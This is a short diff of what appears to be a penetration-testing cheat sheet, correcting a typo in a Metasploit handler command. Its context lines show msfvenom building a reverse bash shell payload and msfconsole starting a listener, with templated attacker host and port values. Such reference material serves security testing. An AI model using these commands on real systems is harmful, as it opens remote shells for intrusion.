@@ -82,7 +82,7 @@ msfvenom -p cmd/unix/reverse_bash LHOST=#{LHOST} LPORT=#{LPORT} -f raw > shell.s
 msfconsole -x "use exploit/multi/handler; set payload #{msf_module}; set LHOST #{LHOST}; set LPORT #{LPORT}; exploit -j"
 
 # desc: MSFconsole
-use exploit/mulit/handler
+use exploit/multi/handler
 set payload #{msf_module}
 set LHOST #{LHOST}
 set LPORT #{LPORT}
